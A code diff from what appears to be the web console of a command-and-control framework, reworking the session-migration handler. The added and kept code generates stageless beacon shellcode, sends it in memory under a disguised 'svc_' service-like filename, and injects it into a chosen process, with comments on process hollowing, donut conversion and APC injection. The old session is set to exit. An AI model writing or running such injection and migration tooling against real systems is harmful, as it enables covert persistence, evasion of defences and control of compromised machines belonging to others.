@@ -124,28 +124,34 @@ async function handleMigrate() {
   const opt = listenerOptions.value.find((l) => l.name === form.listener)
   busy.value = true
   try {
-    // 1. 生成无阶段 shellcode（bin）
-    const blob = await generateClientBinaryBlob({
-      listener: form.listener,
-      osType: form.os,
-      archType: form.os === 'windows' ? 'amd64' : 'amd64',
-      pass: '', // 注入载荷强制无口令：反射加载无命令行参数，带口令会因 ExecuteKey 校验失败退出
-      format: 'exe', // 进程镂空: 完整 beacon PE 由客户端以新进程加载(hollow), 可靠上线
-      vkey: opt?.vkey || undefined,
-      encryptSalt: opt?.encryptSalt || undefined,
-      quietMode: '1',
-    })
-    if (!blob) {
-      ElMessage.error(isZh.value ? '生成失败' : 'Generation failed')
-      return
+    if (!form.listener) {
+      // 一键迁移: 服务端按会话监听器配置自动重建 beacon→donut→注入(tech 默认 apc)→原进程延迟退出
+      await ClientAPI.migrate({ uid, pid: parseInt(pid, 10), tech: form.tech || 'apc' })
+      ElMessage.success(isZh.value ? '迁移已下发: 新会话将以目标进程身份上线, 原会话稍后退出' : 'Migration dispatched; new session will come online as the target process, old session exits shortly')
+    } else {
+      // 手动指定监听器: 走前端编排(生成无阶段载荷 + 内存注入, 原进程保留)
+      const blob = await generateClientBinaryBlob({
+        listener: form.listener,
+        osType: form.os,
+        archType: form.os === 'windows' ? 'amd64' : 'amd64',
+        pass: '', // 注入载荷强制无口令：反射加载无命令行参数，带口令会因 ExecuteKey 校验失败退出
+        format: 'exe', // 进程镂空: 完整 beacon PE 由客户端以新进程加载(hollow), 可靠上线
+        vkey: opt?.vkey || undefined,
+        encryptSalt: opt?.encryptSalt || undefined,
+        quietMode: '1',
+      })
+      if (!blob) {
+        ElMessage.error(isZh.value ? '生成失败' : 'Generation failed')
+        return
+      }
+      // 2. 经加密命令通道内存下发（不落盘）并注入
+      const rand = Math.random().toString(36).slice(2, 8)
+      const fname = `svc_${rand}.bin`
+      const file = new File([blob], fname, { type: 'application/octet-stream' })
+      await ClientAPI.inject_mem({ uid, pid, tech: form.tech || 'auto', file })
+      ElMessage.success(isZh.value ? '已内存下发并注入，新会话将以目标进程身份上线（结果见交互控制台）' : 'Shellcode dispatched in-memory and injected; new session will come online as the target process (see Interact console)')
     }
-    // 2. 经加密命令通道内存下发（不落盘）并注入
-    const rand = Math.random().toString(36).slice(2, 8)
-    const fname = `svc_${rand}.bin`
-    const file = new File([blob], fname, { type: 'application/octet-stream' })
-    await ClientAPI.inject_mem({ uid, pid, tech: form.tech || 'auto', file })
-    ElMessage.success(isZh.value ? '已内存下发并注入，新会话将以目标进程身份上线（结果见交互控制台）' : 'Shellcode dispatched in-memory and injected; new session will come online as the target process (see Interact console)')
-    // 4. 打开控制台看结果
+    // 打开控制台看结果
     workspace.openTab({ id: `beacon:${uid}`, title: `beacon: ${uid.slice(0, 8)}`, component: 'beacon', params: { uid } })
     close()
   } catch (e: any) {
